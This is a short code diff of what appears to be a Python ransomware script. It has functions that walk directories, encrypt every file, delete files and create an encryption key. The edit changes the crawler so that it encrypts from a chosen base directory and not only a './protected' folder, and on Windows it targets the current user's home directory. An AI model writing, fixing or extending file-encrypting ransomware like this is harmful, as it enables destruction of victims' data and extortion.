@@ -47,7 +47,7 @@ def remove_file(filepath):
     os.remove(filepath)
 
 def crawl(basedir):
-    for path, curdir, files in os.walk("./protected"):
+    for path, curdir, files in os.walk(basedir):
         for file in files:
             filepath = os.path.join(path, file)
             encrypt_file(filepath, f)
@@ -65,7 +65,7 @@ def create_enc_key():
 def get_target_directories():
     current_user = os.getlogin()
     current_os = os.name
-    if os.name == "posix":
+    if current_os == "posix":
         return ["./protected"]
     else:
         base_dir = f"C:\\Users\\{current_user}"
